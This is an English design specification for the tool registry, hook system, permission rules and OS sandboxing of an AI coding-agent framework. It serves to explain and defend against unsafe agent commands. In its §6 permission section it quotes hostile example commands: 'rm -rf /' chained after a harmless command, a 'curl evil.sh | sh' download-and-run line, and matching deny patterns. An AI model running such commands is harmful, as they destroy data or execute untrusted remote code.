# Tools and Hooks Design Specification

<p align="center">  <a href="tools-and-hooks.md">中文</a> · <b>English</b>  </p>

> This is the design-contract document for the `zhuye-tools` /
> `zhuye-hooks` crates; source doc-comments reference sections of this
> page in `§N.M` form. Behavior is defined by the code — where this
> document and the code disagree, treat it as a doc bug; feel free to
> fix the docs or file an issue.

## §1 Tool overview and registry layering

The `Tool` trait (`zhuye-tools/src/tool.rs`) is the common contract of
all tools: `name` / `description` / `parameters_schema` (JSON Schema
2020-12) / `is_concurrency_safe` / `execute(ctx, args)`.

`ToolRegistry` is a flat `HashMap<String, (ToolSource, Arc<dyn Tool>)>`,
categorized by registration source into 5 kinds (this is not a layered
lookup):

| Source | Registered by | Typical content |
|---|---|---|
| Builtin | framework startup | built-in tools (§2) |
| Runtime | integration layer | `mcp__<server>__<tool>` (MCP), `lsp` (LSP), `ast`, `checkpoint` / `rewind` / `cron` (exec) |
| Plugin | plugin lifecycle | tools declared by plugin manifests |
| Mcp | MCP client | tools exposed by MCP servers |
| Remote | serve mode | host-language functions registered by the Python / TS SDKs |

On a name collision the **later registration wins** (`register`
overwrites the HashMap entry directly); `register_if_absent` keeps the
existing one.

**The safety floor is not automatic.** `register_with_source` writes
directly without wrapping in `FloorEnforcingTool`; only the
`register_with_source_floor` and the convenience entries
`register_runtime_tool` / `register_plugin_tool` / `register_mcp_tool`
trigger the wrapping. After wrapping, external sources (Runtime / Plugin
/ Mcp) have `required_permission()` no lower than `Prompt` — external
tools cannot drop the main program's minimum gate down to `Auto`.

`ToolSource::Remote` does **not** count as an external source
(`is_external()` only includes Runtime / Plugin / Mcp); its floor is
`Auto`: remote tools run in the client's own process, and this process's
approval has nothing to protect. The SDK side is responsible for its own
gating.

## §2 Built-in tool contracts

There are 27 core built-in tools (`BUILTIN_TOOL_COUNT`), registered
uniformly by `register_builtin_tools`, implemented in
`crates/abilities/zhuye-tools/src/builtins/` (`ast` is injected by the
caller; `memory` lives in `zhuye-exec`, see below). 27 is the core
registration list — orchestration / cron / plugin / MCP / SDK remote
tools get registered on top; it is not the full set of
runtime-visible tools. The names come in two camps: **the plan /
worktree family is PascalCase**, everything else is snake_case.

| Tool | Purpose |
|---|---|
| `bash` | run a shell command in the workspace; working directory persists across calls |
| `read` | read a text file (with line numbers) |
| `write` | write a file, returns a diff |
| `edit` | exact string replacement, returns a diff |
| `delete_file` | delete a file (does not delete directories) |
| `glob` | list files by pattern, sorted by mtime descending |
| `grep` | regex search; with `rank=bm25` re-ranks by BM25 relevance |
| `notebook_edit` | CRUD on `.ipynb` cells |
| `memory` | persistent memory read/write: list / read / write / remove (`## <key>` entry blocks, project / user dual scope; write is Prompt, read is Auto). Stored in `MEMORY.md`, same source as the pre_loop injection |
| `image_view` | return a local image as a multimodal content block |
| `echo` | echo the input back verbatim (pure function, concurrency-safe) |
| `brief` | summarize attachments / long context into a briefing block |
| `web_fetch` | fetch a URL, convert the body to Markdown |
| `web_search` | Brave Search, returns title / link / snippet |
| `ask_user` | free-text question, blocks the current turn; with `secret=true` the answer is redacted |
| `ask_user_question` | 1-4 structured questions × 2-4 options, blocks the current turn |
| `request_human_input` | cross-process persistent human input, polls every 500ms |
| `tool_search` | search available tools by keyword |
| `get_context_remaining` | report cumulative tokens, window size and remaining quota |
| `background_status` | status of background tool calls |
| `EnterPlanMode` / `ExitPlanMode` / `PlanWrite` | the control plane of the read-only plan mode |
| `EnterWorktree` / `ExitWorktree` | enter / exit a temporary git worktree |
| `checkpoint` / `rewind` | git snapshots: create / roll back a `zhuye-checkpoint` snapshot (§10) |

Common conventions:

- path arguments (`file_path` / `path`) are **always** resolved inside
  the workspace, with escapes rejected (`ToolError::PathEscape`).
  `grep` / `glob`'s `path` (the search root) goes through
  `resolve_sandbox_dir` too — no exception: before 0.6 they fed the
  argument straight into `WalkBuilder` and could walk the entire
  filesystem;
- `read` records via the `FileReadStateTracker` first (§4.4);
  `edit` / `write` validate "read before write" via
  `ReadBeforeEditHook` (§5);
- tool output is uniformly `ToolOutput { content, is_error, metadata,
  elapsed_ms }`. **Each tool has its own truncation ceiling** (see the
  table below); there is no uniform 16 KiB truncation; 16 KiB is the
  per-field on-disk ceiling for rollout JSONL (`zhuye-rollout`) and is
  unrelated to tool output.

| Tool | Ceiling | Beyond it |
|---|---|---|
| `bash` | 100 KiB per stream (another 100 KiB total cap) | full output written to a temp file; the path is returned for `read` to fetch |
| `read` | 2000 lines (1000 head + 1000 tail) | an omission marker is inserted in the middle |
| `grep` | `max_results` (default 100) | reports `truncated` + the omitted count |
| `glob` | 1000 entries | reports `truncated` |
| `web_fetch` | body 5 MiB / markdown 50000 characters | reports `body_truncated` / a markdown truncation marker |
| `web_search` | body 2 MiB / output 8 KB | accumulates entry by entry until the cap, then stops |

Byte-based truncations all go through
`zhuye_protocol::truncate_str` to align to char boundaries (0.8): CJK
content is 3 bytes per character, and a direct `String::truncate` /
byte-slice would panic at a non-boundary. `web_fetch`'s markdown ceiling
is in **characters**, not bytes.

Per-tool details:

- §2.1 `read`: offset / limit pagination; images go through
  `image_view` multimodal blocks; notebooks use `notebook_edit`'s
  list / read actions. `offset` / `limit` have `maximum` upper bounds
  (0.9: previously `offset + limit` could wrap around and cause a
  slice panic), and there is a 32 MiB file-size ceiling before
  reading.
- §2.2 `write`: whole-file overwrite; read-before-write validation;
  reports the bytes written. On-disk it is an atomic temp + rename
  write; path validation applies equally to relative paths (0.2:
  previously `if path.is_absolute()` let relative `..` traversals through
  entirely).
- §2.3 `edit`: `old_string` exact match; multiple hits is an error;
  mtime drift beyond the threshold refuses the write (to prevent
  concurrent overwrites). `replace_all` is **not** supported (a planned
  gap-filler).
- §2.4 `grep`: `ignore::WalkBuilder` traversal + regex; the sorting
  argument is `rank`, taking `regex` (default) / `bm25` (reflects
  `zhuye-bm25`). Output is paths relative to the workspace.
- §2.5 `glob`: pattern / path; also walks the ignore tree (respecting
  .gitignore). The current implementation is **path substring
  matching** (not real glob), sorting by mtime descending with a
  path-name lexicographic tie-break.

`url_safety` is an internal SSRF-protection helper of `web_fetch`, not a
standalone tool.

## §3 Tool execution queue and concurrency model

`ToolExecutionQueue` (`zhuye-tools/src/queue.rs`):

- tools with `is_concurrency_safe() == true` (read / grep / glob / web
  family) run concurrently; unsafe tools (bash / write / edit) run
  **serially in submission order** to prevent write-write conflicts;
- the queue consumes hook decisions: a PreToolUse `Deny` becomes an
  error result directly, `ModifyArgs` replaces the arguments,
  `PermissionOverride` switches the permission mode, `Ask` routes to
  the ApprovalGate (§7);
- cancellation: `CancellationToken` cascading (kills the bash
  subprocess, interrupts the stream).

## §4 Hook events and the decision protocol

### §4.1 Events (12 kinds, `zhuye-hooks/src/event.rs`)

| Event | Trigger point | Can the hook veto |
|---|---|---|
| `PreToolUse` | before tool execution | yes (Deny / ModifyArgs / PermissionOverride / Ask) |
| `PostToolUse` | after a tool succeeds | no (audit) |
| `PostToolUseFailure` | after a tool fails / times out | no |
| `Stop` | before the turn ends | yes (Deny forces the turn to continue) |
| `SessionStart` | session startup, once per thread | no |
| `SessionEnd` | session end (Op::Shutdown or channel close), v1.6 | no |
| `UserPromptSubmit` | before the prompt enters the model | yes (Deny rejects the whole turn) |
| `PreCompact` | before compaction runs | yes (Deny skips this round of compaction) |
| `PostCompact` | after compaction completes, v1.6 | no (audit / recovery hooks) |
| `TaskCreated` / `TaskUpdated` / `TaskCompleted` | task board lifecycle | no |

`HookEvent` does not carry the full `ToolContext` (to avoid a
tools↔hooks circular dependency); events that need context get a
slimmed `HookContext { session_id, turn_id, workspace, permission_mode }`.

### §4.2 Decisions (7 kinds, `decision.rs`)

`Allow` / `Deny { reason }` / `ModifyArgs(json)` /
`InjectMessage(SystemMessage)` / `PermissionOverride(PermissionMode)` /
`Ask { reason }` (routes to the human-approval modality) /
`Combined(Vec)` (one hook returning multiple decisions).

### §4.3 Normalization and merge priority

`Combined` is flattened recursively by `HookDecision::resolve()`,
classifying leaves by priority: **Deny > Ask > ModifyArgs (the later
one wins) > InjectMessage (all collected)**. `Allow` does not
participate in the priority; it only means "no action".

Flattening classifies by **occurrence order** of leaves via DFS (a
stack-style traversal would reverse the order, causing the semantic
mix-up of "the first Deny wins / the last ModifyArgs wins").

`HookEngine::dispatch` calls the hooks subscribed to the event in
registration order, then applies the same classification rules: any
Deny is a terminal Deny; multiple ModifyArgs — later overrides earlier;
multiple InjectMessages are concatenated; multiple Asks take the first
(avoiding chained pop-ups).

### §4.4 Read-state tracking (file_read_state.rs)

`FileReadStateTracker` records "which files were read when, at what
mtime", so that `ReadBeforeEditHook` (§5) can judge whether an
edit/write's old_string is based on fresh content; `DenyReason`
distinguishes "never read" / "stale (mtime drift)".

## §5 Built-in hooks and the config schema

Built-in hooks (`zhuye-hooks/src/builtins/`):

- §5.1 `SearchBudgetHook`: a per-turn budget on grep/glob call counts;
  over the limit, a reminder is injected.
- §5.2 `TestRunnerHook`: automatically runs the test command after
  PostToolUse (write-type tools).
- §5.3 `PlanCompletionHook`: a Stop hook; before allowing a turn to end
  for an `AgentDecision` reason, it requires explicit verification; in
  `strict` mode it injects a reminder and Denies, at most 3 times.
  It is **not** a plan-step completion tracker.
- §5.4 `VerificationHook`: runs a verification command at Stop; failure
  Denies and forces continued repair.
- `PlanModeGate`: blanket-denies write tools in plan mode (see
  PLAN_MODE.md).
- `ReadBeforeEditHook`: read-before-write enforcement (§4.4).
- `LangfuseTracker`: telemetry instrumentation.

### §5.5 Config schema

`[hooks]` in config.toml is a **set of named subsections**, not an
array:

```toml
[hooks]
enabled = ["search_budget", "verification"]   # omitted = all enabled
disabled = ["verification"]                   # v1.x: explicit disable (written back at runtime by zhuye hooks disable)

[hooks.search_budget]
max_calls = 20
search_tools = ["grep", "glob"]

[hooks.verification]
run_on_stop = true
test_command = "cargo test -p zhuye-core --lib"
```

Available subsections: `search_budget` / `test_runner` /
`plan_completion` / `verification` / `langfuse_tracker` /
`read_before_edit`. (`HooksConfig` in `zhuye-hooks/src/config.rs` is the
hooks-side mirror of the same field set, without `read_before_edit`;
that field only exists on the config crate's `HooksSection`.)

**Enable/disable persistence (v1.x)**: the `[hooks].disabled` list
persists `HookEngine`'s runtime disables — the three CLI commands
`zhuye hooks ls / disable / enable` read/write it (the same config write
entry as `plugin enable`); `build_engine` applies it uniformly after
registration: built-in hooks are registered first and disabled after,
unregistered plain names are silently no-ops; a plugin hook's disabled
state is preserved until the plugin registers, then takes effect.

**Plugin hook env whitelist**: `env: ["NAME", ...]` in `hooks.json`
explicitly lets through environment variables that would otherwise be
stripped as secrets (the whitelist wins). The `ShellHook` subprocess has
its env cleared and then keeps only HOME / PATH and the explicit
allowlist.

**External command-style hooks** (`ShellHook`, shell.rs) are a separate
mechanism, going through `hooks.json`, not through config.toml: the
event JSON is written to the subprocess stdin, stdout returns a JSON
decision (`{"decision":"deny","reason":"..."}` etc.); **fail-closed** —
a command timeout or non-zero exit is treated as Deny. The constructor
arguments are `{ name, event, matcher?, command, timeout }` (`timeout`
is a `Duration`, not a millisecond count); `event` accepts
**lowercase, no-underscore** event names (`pretooluse` / `posttooluse` /
`stop` …), unknown names are skipped with a warning; `matcher` only
applies to events carrying a tool name, supporting `*` / `?` wildcards.

## §6 Permission modes

7 levels (defined in zhuye-protocol): `Auto` / `Prompt` / `Deny` /
`Plan` / `AcceptEdits` / `Bubble` (non-blocking notification) / `Bypass`
(silent full approval). The rule engine is in `zhuye-permissions`
(exact tool name + tool_glob + bash shell_pattern, with
match-context awareness); bash commands go through `classify_command`
three-level classification (Safe / Risky / Dangerous) for
approval-grading.

Rules can also use `resource_glob` to constrain `path`, `file_path` or
`url` in common tool arguments. The path is checked both in its raw
form, as a workspace absolute path, and as a resolvable symlink target;
multiple representations match within the same rule-evaluation pass
without changing rule priority. When a resource is missing or the
resource glob is invalid, `Deny` rules matching other known conditions
fail closed. Before a tool executes, explicit policies are checked: even
without an interactive approval gate, `Deny` and `Ask`s that cannot be
presented to the user still refuse execution; tools with no rules are
handled per their original permission mode. User-level rules live in
`$ZHUYE_HOME/permissions.toml` (`$HOME/.zhuye/permissions.toml` when
unset); if any permission rule file cannot be read or parsed, tool calls
are refused, and rule evaluation resumes once the file is fixed.

### shell_pattern semantics (0.4)

`shell_pattern` splits on `&&` / `||` / `|` / `;` and then matches, and
**the matching mode depends on the action**:

- **`Deny` → any one segment hitting blocks it.** Missing a segment
  would be a real hole, so `deny = "rm -rf *"` catches
  `git status; rm -rf /`.
- **`Allow` / `Ask` → all segments must hit.** Otherwise
  `allow = "git push *"` would let the whole
  `git push origin main && curl evil.sh | sh` through (the first
  segment matches, the next two ride along).

Two more points:

- a `Deny` rule fails closed by returning `Deny` when there is **no bash
  command context** (previously it silently skipped, and any call site
  that forgot to pass the command would nullify Deny);
- `*` crosses `/` by default (globset default behavior). This is **not**
  a bug — turning it off would break common patterns like `rm -rf *`
  that must match any target path, and the segment splitting already
  solves the problem it was meant to solve.

### Aliases for the bash command argument (0.3)

The `bash` tool's schema declares the argument name as `cmd`, but
internally `execute` takes the first non-empty string in the order
`cmd` → `command` → `cmdline` (weak models often put the command in the
latter two). **Every security checkpoint must use
`zhuye_protocol::resolve_bash_command(args)` and cannot just read
`args["cmd"]`** — otherwise when the model sends
`{"command": "rm -rf /"}`, the `shell_pattern` rules (including Deny),
the `dangerous_bash` baseline, the risk grading, and the Plan mode
determination all silently stop working.

This function lives in `zhuye-protocol` because `zhuye-tools` and
`zhuye-hooks` have a one-way dependency, and a normalization shared by
both sides cannot sit in either layer (same reason as `ToolError`).

## §7 Approval gate (ApprovalGate)

`zhuye-tools/src/approval/gate.rs`: `ask` emits
`EventMsg::ApprovalRequest` and waits for the `Op::ToolApproval`
receipt; ApproveForSession (remembered within the session) is
supported. A hook's `Ask` decision routes here too
(`ApprovalKind::Hook`).

## §8 Sandboxing

### §8.1 OS-level sandbox (Seatbelt / Landlock)

`zhuye-sandbox/src/os_sandbox.rs`: macOS Seatbelt (profile-level
policies, workspace-write default) / Linux Landlock (path whitelist).
Enabled by the `sandbox` argument of the bash tool; the policy is
orthogonal to the permission mode (see §6). Network isolation is
currently implemented only at the `web_fetch` layer (SSRF protection:
private network segments / per-hop redirect validation).

`read` and the LSP tools use fixed file handles when syncing documents,
and reject symlink escapes caused by path substitution; `read` also
enforces the byte ceiling on read. An LSP server subprocess accessing
files on its own is not subject to this limit; its runtime environment
and permissions should be configured per source.

### §8.2 The handled access-right set for Linux Landlock (0.1)

Landlock only restricts the access rights listed in
`handled_access_fs`; the workspace (and extra writable directories) are
let through via `landlock_add_rule`. The design decision is **to
restrict only write-type operations, leaving read / exec completely
unrestricted** — compiling / analyzing often needs to read system
headers and dependencies, and restricting reads would break usability
at large.

The set is `0x1ff2` (`WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_CHAR |
MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_BLOCK | MAKE_SYM`),
built by OR-combining named constants one by one, guarded by a
compile-time `assert!`. **Do not** hand-write the literal: before 0.1
it read `0xffe`, which included extra `READ_FILE` / `READ_DIR` (→ reads
outside the workspace were kernel-rejected; at `execve` the dynamic
linker couldn't read `/usr/lib`, surfacing as
`spawn failed: EACCES`) and missed `MAKE_SYM` (→ creating symlinks
outside the workspace was completely unrestricted).

### §8.3 strict mode and degradation (0.1)

`OsSandbox::default()` = `enabled + strict`. `enforce_or_fail()` returns
`Err` when strict + the backend is unavailable, and BashTool throws
`ToolError::SandboxUnavailable` accordingly **instead of** running
bare.

- `strict = true` (default): permission-class spawn failures
  (EACCES / EPERM) fail closed directly and are **never** degraded to
  unsandboxed execution. On Linux, `enforce_or_fail` also does a
  non-destructive kernel probe (an empty `landlock_create_ruleset`
  call) to catch false positives like "the kernel has no Landlock at
  all".
- `strict = false`: keeps the degradation semantics (rebuild the
  command without `pre_exec` and retry once) and logs `warn!`. Enable
  explicitly with `ZHUYE_SANDBOX_STRICT=0` or
  `ZHUYE_SANDBOX_OS_LEVEL=0`.

`status_line()` reports the network boundary **truthfully per
backend**: Seatbelt really emits `(deny network*)`; Landlock's
`handled_access_net` is always 0, so it is labeled "network: not
sandbox-constrained" rather than "network: denied".

## §9 Plan mode

For the entry point, whitelist, and exit codes of the read-only plan
mode, see [PLAN_MODE.md](PLAN_MODE.md).

## §10 git capability family and checkpoint (absorbed from the client, WP8/17)

### §10.1 Snapshot semantics (zhuye-git::checkpoint)

- **Tag-ified**: every snapshot from `CheckpointTool::create` /
  `RewindTool` is a commit with a `zhuye-checkpoint:` subject plus a
  `zhuye-cp/<sha8>` tag. The tag stays reachable even after
  `reset --hard` — "want to undo an undo after rewinding" relies on
  it; `git log` from HEAD cannot see a snapshot already detached from
  the branch.
- **Safety snapshot before rewind**: rewind first takes a
  `pre-rewind safety snapshot` of the current (possibly dirty) working
  tree before resetting; to change your mind, rewind to the safety
  snapshot.
- **Whitelist validation**: rewind only accepts shas from the tag list
  (`find_checkpoint`, limit 200); malformed / arbitrary user-picked
  commits are rejected.
- `create` returns no-changes when there is nothing to commit;
  `--no-verify` skips the pre-commit hook (a safety net should not be
  blocked by the project's own lint).

### §10.2 Plugin and hooks

- `plugins/git-tools`: MCP tools `git_branch_summary` (branches + diff
  stats against the default branch + open PRs, gh best-effort) +
  `git_checkpoint_create`;
- `plugins/git-tools/hooks/hooks.json`: the Stop hook `zhuye-cp-hook`
  auto-snapshots at the end of every turn. It **always exits 0** —
  external hooks are fail-closed (non-zero = Deny), and a Stop Deny
  means vetoing completion and forcing the turn to continue; a
  checkpoint failure must not cause an infinite continuation loop
  (failure details go to stderr).

### §10.3 Assistant output directives (zhuye-git::directives)

Inline directives of the form
`::git-{stage,commit,create-branch,push,create-pr}{cwd=…}` are stripped
by the rendering layer into structured actions;
`::code-comment{title body file …}` is rewritten as visible Markdown
(priority `[P0-3]`). The two attribute parsers are intentionally
different in behavior (git directives do not escape; code-comment
supports `\"` via `parse_quoted_value`); this is pinned by tests — do
not unify them.
